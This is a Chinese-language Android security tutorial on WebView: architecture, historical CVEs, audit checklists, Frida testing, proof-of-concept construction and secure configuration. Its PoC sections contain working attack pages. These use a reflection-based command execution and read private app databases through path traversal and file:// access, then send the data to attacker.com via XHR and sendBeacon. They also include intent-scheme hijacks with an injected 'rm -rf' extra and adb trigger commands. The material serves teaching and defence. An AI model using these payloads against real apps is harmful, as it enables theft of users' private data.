# 7x00 - WebView Security

WebView 是 Android 应用中嵌入网页的核心组件，也是CVE高发的复杂攻击面。

WebView 的安全挑战来自多层叠加：
- **Chromium内核复杂度**：数百万行C++代码，持续演进的Web标准
- **跨语言桥接**：JavaScript ↔ Java/Kotlin的类型转换与权限传递
- **混合信任边界**：Web内容(不可信) ↔ App逻辑(高权限)
- **多进程协调**：Browser进程、渲染进程、GPU进程的安全隔离

## 1. 架构与多进程模型

### 1.1 WebView Provider演进

**历史**：
- Android 4.4前：基于WebKit的原生WebView（已废弃）
- Android 4.4+：基于Chromium的WebView
- Android 5.0+：WebView作为可更新APK（Google WebView / Chrome）
- Android 7.0+：Chrome可作为WebView Provider

**当前主流**：
```text
/system/app/webview/webview.apk  或
/data/app/com.google.android.webview-xxx/
```

### 1.2 多进程架构

```text
┌─────────────────────────────────────────┐
│  App Process (应用主进程)                 │
│  - WebView API调用                       │
│  - JS Bridge接口暴露                     │
│  - Cookie/Storage访问                    │
├─────────────────────────────────────────┤
│         ⬇ Binder IPC                    │
├─────────────────────────────────────────┤
│  Browser Process (webview_zygote派生)   │
│  - 导航控制                              │
│  - 网络请求                              │
│  - 进程管理                              │
├─────────────────────────────────────────┤
│         ⬇ Unix Socket                   │
├─────────────────────────────────────────┤
│  Renderer Process (沙箱隔离)            │
│  - HTML/CSS/JS解析                       │
│  - DOM操作                               │
│  - V8 JavaScript引擎                     │
│  ⚠️ 受Seccomp/SELinux严格限制            │
├─────────────────────────────────────────┤
│  GPU Process (可选)                      │
│  - 硬件加速渲染                          │
└─────────────────────────────────────────┘
```

**关键安全特性**：

**Site Isolation (站点隔离)**：
- Chrome 67+ / Android WebView逐步落地
- 不同origin的页面运行在不同渲染进程
- 防御Spectre等侧信道攻击
- 限制跨站信息泄露

**渲染进程沙箱**：
- SELinux domain: `isolated_app` (高度受限)
- Seccomp: 仅允许极少syscall
- 无文件系统访问（除共享内存）
- 无网络socket权限

**进程隔离的安全边界**：
- ✅ 渲染进程漏洞 → 难以直接影响App逻辑
- ❌ Browser进程漏洞 → 可能突破沙箱
- ❌ JS Bridge暴露 → 绕过进程隔离

## 2. 历史重大漏洞与攻击模式

### 2.1 Chromium RCE漏洞传导到WebView

WebView基于Chromium，Chrome的高危漏洞会同步影响Android。

**CVE-2020-6418 (V8 Type Confusion RCE)**：
- **根因**：V8 JavaScript引擎的类型混淆
- **触发**：特制JavaScript代码触发JIT编译器错误
- **影响**：渲染进程RCE
- **利用链**：
  ```text
  恶意网页 → V8类型混淆 → 渲染进程RCE
      → 沙箱逃逸(需额外漏洞) → Browser进程控制
      → App进程攻击(通过IPC)
  ```

**CVE-2021-30551 (V8 Turbofan OOB)**：
- **位置**：V8优化编译器Turbofan
- **根因**：越界访问导致任意读写
- **实战**：被用于Pwn2Own竞赛
- **修复**：Chrome 91 / WebView同步更新

**CVE-2022-1096 (V8 UAF in Animation)**：
- 野外利用(ITW)被Google TAG发现
- 渲染进程UAF → RCE
- 需要结合沙箱逃逸才能完整攻击

### 2.2 JS Bridge经典漏洞

**CVE-2012-6636 (addJavascriptInterface RCE)**：

**历史背景**：Android 4.2前的灾难性设计缺陷

```java
// 应用代码
webView.addJavascriptInterface(new JsInterface(), "android");

class JsInterface {
    public String getData() { return "safe"; }
}
```

**攻击原理**：
```javascript
// 恶意网页
function execute(cmd) {
    // 通过Java反射调用任意类
    return android.getClass()
        .forName('java.lang.Runtime')
        .getMethod('getRuntime', null)
        .invoke(null, null)
        .exec(cmd);
}

execute(['sh', '-c', 'cat /data/data/com.victim.app/databases/user.db']);
```

**影响**：
- 任意Java代码执行
- 完全突破应用沙箱
- 影响Android 4.2以下所有WebView

**修复**：
- Android 4.2+ 引入`@JavascriptInterface`注解
- 仅标注方法可被JS调用
- 默认禁止反射访问

**现代变种**：

即使有`@JavascriptInterface`，仍可能出现：

```java
// 危险代码
@JavascriptInterface
public void openUrl(String url) {
    Intent intent = new Intent(Intent.ACTION_VIEW);
    intent.setData(Uri.parse(url));  // ❌ url可控
    startActivity(intent);
}
```

```javascript
// 攻击
android.openUrl('file:///data/data/com.victim.app/databases/secrets.db');
```

### 2.3 File协议UXSS (Universal XSS)

**CVE-2014-6041 / CVE-2015-3860系列**：

**根因**：`file://` 协议的同源策略处理错误

```javascript
// 场景1: file:// 可读取应用私有文件
fetch('file:///data/data/com.victim.app/shared_prefs/config.xml')
    .then(r => r.text())
    .then(data => sendToAttacker(data));

// 场景2: file:// 访问content://
var xhr = new XMLHttpRequest();
xhr.open('GET', 'content://com.victim.provider/secrets');
xhr.send();
```

**危险设置组合**：
```java
webView.getSettings().setAllowFileAccess(true);
webView.getSettings().setAllowFileAccessFromFileURLs(true);  // ❌ 高危
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);  // ❌ 更高危
```

**攻击向量**：
- Deep link触发 `file:///sdcard/malicious.html`
- MMS/邮件附件自动预览
- 下载的HTML文件被WebView打开

### 2.4 Intent Scheme劫持

**CVE-2014-1939 类问题**：

```java
// 应用代码
webView.setWebViewClient(new WebViewClient() {
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, String url) {
        if (url.startsWith("intent://")) {
            Intent intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);
            startActivity(intent);  // ❌ 未校验intent内容
            return true;
        }
        return false;
    }
});
```

**攻击**：
```html
<a href="intent://scan/#Intent;scheme=zxing;package=com.victim.app;component=com.victim.app/.SecretActivity;S.extra_data=malicious;end">
    Click me
</a>
```

可能导致：
- 启动未导出的组件
- 传递恶意Intent extras
- 绕过权限检查

### 2.5 不可信 URL 被加载

- `loadUrl()` 的参数来源可控（deep link、二维码、分享链路）
- `shouldOverrideUrlLoading()` 里放行过宽
- 未限制 scheme（`file://`、`content://`、自定义 scheme）

### 2.6 JS Bridge 风险面

`addJavascriptInterface` 的风险不在于"存在"，而在于：

- 暴露的方法是否包含敏感能力（文件、账户、支付、系统设置）
- 是否允许来自不可信域名的页面调用
- 是否存在参数注入导致路径遍历/命令拼接/反序列化等二次漏洞

### 2.7 WebView配置不当导致的安全问题

**危险配置清单**：

```java
// ❌ 文件访问类(最高危)
setAllowFileAccess(true)  // 允许file://
setAllowFileAccessFromFileURLs(true)  // file:// 可读其他file://
setAllowUniversalAccessFromFileURLs(true)  // file:// 可读任意origin

// ❌ 内容访问
setAllowContentAccess(true)  // 允许content://

// ⚠️ 必要但需谨慎
setJavaScriptEnabled(true)  // 启用JS(必需但增加攻击面)
setDomStorageEnabled(true)  // localStorage/sessionStorage

// ❌ 调试功能
setWebContentsDebuggingEnabled(true)  // 允许Chrome DevTools连接

// ⚠️ Mixed Content
setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)  // 允许HTTPS页面加载HTTP资源
```

**安全配置推荐**：

```java
WebSettings settings = webView.getSettings();

// ✅ 禁用危险的文件访问
settings.setAllowFileAccess(false);
settings.setAllowFileAccessFromFileURLs(false);
settings.setAllowUniversalAccessFromFileURLs(false);

// ✅ 仅在必要时启用JS
if (needsJavaScript) {
    settings.setJavaScriptEnabled(true);
}

// ✅ 生产环境禁用调试
if (!BuildConfig.DEBUG) {
    WebView.setWebContentsDebuggingEnabled(false);
}

// ✅ 严格的Mixed Content策略
settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);

// ✅ 禁用自动加载图片(可选,防XSS)
settings.setLoadsImagesAutomatically(false);
```

### 2.8 Deep Link/URL Handling漏洞

**不可信输入直接加载**：

```java
// ❌ 危险代码
@Override
protected void onCreate(Bundle savedInstanceState) {
    String url = getIntent().getStringExtra("url");
    webView.loadUrl(url);  // url完全可控!
}
```

**攻击向量**：
```bash
# Intent注入
adb shell am start -n com.victim/.WebActivity \
    --es url "javascript:alert(document.cookie)"

# Deep link
myapp://webview?url=file:///data/data/com.victim/databases/secrets.db
```

**安全校验**：

```java
private static final Set<String> ALLOWED_SCHEMES = 
    Set.of("https", "http");
private static final Set<String> ALLOWED_HOSTS = 
    Set.of("trusted.example.com", "api.example.com");

public void loadUrlSafely(String url) {
    try {
        Uri uri = Uri.parse(url);
        String scheme = uri.getScheme();
        String host = uri.getHost();
        
        if (!ALLOWED_SCHEMES.contains(scheme)) {
            Log.w(TAG, "Blocked scheme: " + scheme);
            return;
        }
        
        if (!ALLOWED_HOSTS.contains(host)) {
            Log.w(TAG, "Blocked host: " + host);
            return;
        }
        
        webView.loadUrl(url);
    } catch (Exception e) {
        Log.e(TAG, "Invalid URL", e);
    }
}
```

## 3. 漏洞挖掘与审计方法

### 3.1 静态代码审计Checklist

**URL加载审计**：
- [ ] `loadUrl()` / `loadData()` / `loadDataWithBaseURL()` 的参数来源
- [ ] Deep link / Intent extra 是否直接传递给WebView
- [ ] URL scheme白名单是否严格(仅https)
- [ ] Host白名单是否存在绕过(通配符/子域名问题)

**JS Bridge审计**：
- [ ] `addJavascriptInterface()` 暴露了哪些方法
- [ ] 暴露方法是否访问敏感资源(文件/数据库/网络)
- [ ] 是否有域名/origin校验
- [ ] 参数类型是否严格校验(防注入)
- [ ] 是否使用`@JavascriptInterface`注解

**WebViewClient回调审计**：
- [ ] `shouldOverrideUrlLoading()` 是否处理危险scheme
- [ ] `onPageFinished()` 注入的JS是否安全
- [ ] `shouldInterceptRequest()` 的资源替换逻辑

**WebSettings配置**：
- [ ] `setAllowFileAccess*` 系列是否启用
- [ ] `setJavaScriptEnabled` 是否必要
- [ ] `setWebContentsDebuggingEnabled` 生产环境是否禁用
- [ ] Mixed content策略是否过于宽松

**Cookie/Storage审计**：
- [ ] `CookieManager` 是否泄露敏感token
- [ ] localStorage是否存储敏感数据
- [ ] Cookie的Secure/HttpOnly标志

### 3.2 动态测试方法

**Frida Hook关键API**：

```javascript
// hook loadUrl
Java.perform(function() {
    var WebView = Java.use('android.webkit.WebView');
    
    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
        console.log('[WebView] loadUrl: ' + url);
        send({type: 'loadUrl', url: url});
        return this.loadUrl(url);
    };
    
    // hook addJavascriptInterface
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log('[WebView] addJavascriptInterface: ' + name);
        console.log('[WebView] Object class: ' + obj.getClass().getName());
        
        // 枚举暴露的方法
        var methods = obj.getClass().getDeclaredMethods();
        for (var i = 0; i < methods.length; i++) {
            console.log('  Method: ' + methods[i].getName());
        }
        
        return this.addJavascriptInterface(obj, name);
    };
});
```

**Chrome DevTools调试**：

```bash
# 启用调试(需要应用调用setWebContentsDebuggingEnabled(true)
adb forward tcp:9222 localabstract:webview_devtools_remote_<pid>

# Chrome打开
chrome://inspect/#devices

# 或直接访问
http://localhost:9222
```

**测试用例**：

```html
<!-- test_jsbridge.html -->
<script>
// 测试JS Bridge是否存在
if (window.android) {
    console.log('Android bridge found!');
    
    // 枚举方法
    for (var key in window.android) {
        console.log('Method: ' + key);
        try {
            var result = window.android[key]('test');
            console.log('Result: ' + result);
        } catch(e) {
            console.log('Error: ' + e);
        }
    }
}

// 测试file://访问
try {
    fetch('file:///data/data/com.target.app/shared_prefs/prefs.xml')
        .then(r => r.text())
        .then(data => console.log('File content:', data));
} catch(e) {
    console.log('File access blocked:', e);
}

// 测试Intent scheme
window.location = 'intent://example#Intent;scheme=myapp;end';
</script>
```

### 3.3 自动化扫描

**MobSF (Mobile Security Framework)**：
```bash
# 自动扫描APK中的WebView配置问题
python3 manage.py runserver
# 上传APK分析
```

**自定义脚本扫描**：

```python
#!/usr/bin/env python3
import re
import zipfile
import sys

def scan_webview_issues(apk_path):
    issues = []
    
    with zipfile.ZipFile(apk_path) as z:
        for name in z.namelist():
            if name.endswith('.dex'):
                # 使用dexdump/apktool反编译
                pass
            
            if name.endswith('.xml'):
                content = z.read(name).decode('utf-8', errors='ignore')
                
                # 检查Deep Link配置
                if 'android.intent.action.VIEW' in content:
                    if 'android:scheme="http"' in content:
                        issues.append(f'{name}: HTTP scheme in deep link')
    
    # 检查Java代码(需要反编译)
    dangerous_apis = [
        'setAllowFileAccess(true)',
        'setAllowFileAccessFromFileURLs(true)',
        'setAllowUniversalAccessFromFileURLs(true)',
        'addJavascriptInterface',
    ]
    
    return issues

if __name__ == '__main__':
    issues = scan_webview_issues(sys.argv[1])
    for issue in issues:
        print(f'[!] {issue}')
```

## 4. 调试与漏洞复现

### 4.1 进程与日志分析

**进程识别**：
```bash
# 查看WebView相关进程
adb shell ps -A | grep -E 'webview|chromium'

# 输出示例：
# u:r:isolated_app:s0:c123,c256  u0_i123  12345  456  webview_zygote
# u:r:isolated_app:s0:c124,c257  u0_i124  12346  456  com.target.app:sandboxed_process0
```

**日志监控**：
```bash
# WebView完整日志
adb logcat | grep -iE 'chromium|cr_.*|webview|console'

# JavaScript console.log输出
adb logcat | grep 'Console'
# 输出: I/chromium(12345): [INFO:CONSOLE(10)] "Test message"

# 网络请求日志
adb logcat | grep 'HttpUrlConnection\|OkHttp\|chromium.*http'

# WebView崩溃
adb logcat | grep -iE 'SIGSEGV|Fatal signal.*webview|chromium.*crash'
```

**Tombstone分析**：
```bash
# WebView渲染进程崩溃会生成tombstone
adb shell ls -lt /data/tombstones/
adb pull /data/tombstones/tombstone_XX

# 查找崩溃位置
grep -A 20 'backtrace:' tombstone_XX
# 示例输出：
# backtrace:
#     #00 pc 001234567  /system/lib64/libwebviewchromium.so
```

### 4.2 PoC构造与触发

**场景1: JS Bridge RCE PoC**

```html
<!-- exploit.html -->
<!DOCTYPE html>
<html>
<head><title>WebView Exploit</title></head>
<body>
<h1>Testing JS Bridge</h1>
<script>
function exploit() {
    try {
        // 假设目标应用暴露了FileManager接口
        if (window.FileManager) {
            // 尝试路径遍历读取敏感文件
            var content = window.FileManager.readFile('../../../databases/secrets.db');
            
            // 外传数据
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://attacker.com/collect');
            xhr.send(content);
        }
    } catch(e) {
        console.log('Exploit failed: ' + e);
    }
}

window.onload = exploit;
</script>
</body>
</html>
```

**触发方式**：
```bash
# 方式1: Deep link触发
adb shell am start -n com.target.app/.WebViewActivity \
    --es url "file:///sdcard/Download/exploit.html"

# 方式2: Intent注入
adb shell am start \
    -a android.intent.action.VIEW \
    -d "myapp://webview?url=https://attacker.com/exploit.html"

# 方式3: 通过分享功能
adb shell am start \
    -a android.intent.action.SEND \
    -t text/plain \
    --es android.intent.extra.TEXT "https://attacker.com/exploit.html" \
    -n com.target.app/.ShareActivity
```

**场景2: File Protocol UXSS**

```html
<!-- file_access.html -->
<script>
function stealData() {
    var targets = [
        'file:///data/data/com.target.app/databases/user.db',
        'file:///data/data/com.target.app/shared_prefs/settings.xml',
        'content://com.target.provider/secrets'
    ];
    
    targets.forEach(function(url) {
        fetch(url)
            .then(r => r.text())
            .then(data => {
                console.log('Stolen from ' + url + ':', data);
                // 发送到攻击者服务器
                navigator.sendBeacon('https://attacker.com/steal', data);
            })
            .catch(e => console.log('Failed: ' + url, e));
    });
}

stealData();
</script>
```

**场景3: Intent Scheme劫持**

```html
<!-- intent_hijack.html -->
<a href="intent://scan/#Intent;scheme=myapp;package=com.target.app;component=com.target.app/.PrivateActivity;S.extra_data=malicious_payload;end">
Click to trigger
</a>

<script>
// 自动触发
window.location = 'intent://scan/#Intent;scheme=myapp;package=com.target.app;component=com.target.app/.PrivateActivity;S.cmd=rm%20-rf%20*;end';
</script>
```

### 4.3 沙箱逃逸测试

**测试渲染进程限制**：

```javascript
// 在WebView中执行
try {
    // 尝试syscall (应被seccomp阻止)
    var ws = new WebSocket('ws://attacker.com');
} catch(e) {
    console.log('WebSocket blocked:', e);
}

try {
    // 尝试文件访问 (应被SELinux阻止)
    fetch('file:///system/build.prop')
        .then(r => r.text())
        .then(data => console.log(data));
} catch(e) {
    console.log('File access blocked:', e);
}

// 检查可用API
console.log('IndexedDB:', typeof indexedDB);
console.log('WebGL:', typeof WebGLRenderingContext);
console.log('WebAssembly:', typeof WebAssembly);
```

**验证进程隔离**：
```bash
# 查看渲染进程的SELinux context
adb shell ps -AZ | grep isolated_app

# 查看seccomp状态
adb shell cat /proc/<renderer_pid>/status | grep Seccomp
# Seccomp: 2 表示strict模式

# 尝试从渲染进程访问文件(应失败)
adb shell run-as com.target.app
cat /proc/<renderer_pid>/status
```

## 5. 防御建议

### 5.1 开发安全实践

**最小权限原则**：
```java
// ✅ 安全的WebView初始化模板
public class SecureWebView extends WebView {
    public SecureWebView(Context context) {
        super(context);
        initSecureSettings();
    }
    
    private void initSecureSettings() {
        WebSettings settings = getSettings();
        
        // 禁用文件访问
        settings.setAllowFileAccess(false);
        settings.setAllowFileAccessFromFileURLs(false);
        settings.setAllowUniversalAccessFromFileURLs(false);
        settings.setAllowContentAccess(false);
        
        // 仅在必要时启用JS
        settings.setJavaScriptEnabled(false);
        
        // 安全的混合内容策略
        settings.setMixedContentMode(MIXED_CONTENT_NEVER_ALLOW);
        
        // 生产环境禁用调试
        if (!BuildConfig.DEBUG) {
            setWebContentsDebuggingEnabled(false);
        }
    }
    
    // 仅允许加载HTTPS URL
    public void loadUrlSafely(String url) {
        Uri uri = Uri.parse(url);
        if ("https".equals(uri.getScheme()) && 
            isAllowedHost(uri.getHost())) {
            loadUrl(url);
        } else {
            Log.w(TAG, "Blocked URL: " + url);
        }
    }
}
```

**安全的JS Bridge设计**：
```java
public class SecureJsBridge {
    private static final String ALLOWED_ORIGIN = "https://trusted.example.com";
    private Context context;
    
    @JavascriptInterface
    public String getData(String key) {
        // 验证调用来源
        if (!verifyOrigin()) {
            Log.w(TAG, "Unauthorized JS Bridge call");
            return null;
        }
        
        // 参数校验
        if (!isValidKey(key)) {
            return null;
        }
        
        // 返回非敏感数据
        return getSafeData(key);
    }
    
    private boolean verifyOrigin() {
        // 通过WebView.getUrl()检查当前页面origin
        // 注意：这不是完美方案，建议结合其他机制
        return true; // 实际实现需要origin验证
    }
}
```

**Content Security Policy (CSP)**：
```java
// 通过HTTP头或meta标签限制资源加载
String htmlWithCSP = "<!DOCTYPE html><html><head>" +
    "<meta http-equiv='Content-Security-Policy' " +
    "content='default-src https:; script-src https://trusted.com; " +
    "style-src https://trusted.com; img-src https:; " +
    "connect-src https://api.trusted.com;'>" +
    "</head><body>...</body></html>";

webView.loadDataWithBaseURL(
    "https://trusted.com", 
    htmlWithCSP, 
    "text/html", 
    "UTF-8", 
    null
);
```

### 5.2 企业加固方案

- **双向TLS认证**：敏感WebView强制客户端证书
- **动态安全策略**：服务端下发允许加载的域名白名单
- **运行时完整性检查**：检测Hook/调试/注入
- **定期安全审计**：自动化扫描WebView配置

## 参考资源

### AOSP官方文档
- https://source.android.com/docs/core/ota/modular-system/webview - WebView模块化与独立更新机制
- https://source.android.com/docs/security/app-sandbox - 应用沙箱与进程隔离
- https://source.android.com/docs/security/bulletin - 月度安全公告(WebView CVE主要披露渠道)

### Chromium安全
- https://chromereleases.googleblog.com/ - Chrome稳定版发布日志(含CVE)
- https://bugs.chromium.org/p/chromium/issues/list - Chromium Issue Tracker
- https://chromium.googlesource.com/chromium/src/+/main/docs/security/ - Chromium安全设计文档

### 开发者文档
- https://developer.android.com/reference/android/webkit/WebView - WebView API官方文档
- https://developer.android.com/develop/ui/views/layout/webapps/webview - WebView最佳实践
- https://developer.android.com/develop/ui/views/layout/webapps/debugging - WebView调试指南

### 安全研究
- OWASP Mobile Top 10 - M7: Client Code Quality (WebView相关)
- https://github.com/OWASP/owasp-mastg - OWASP Mobile Application Security Testing Guide
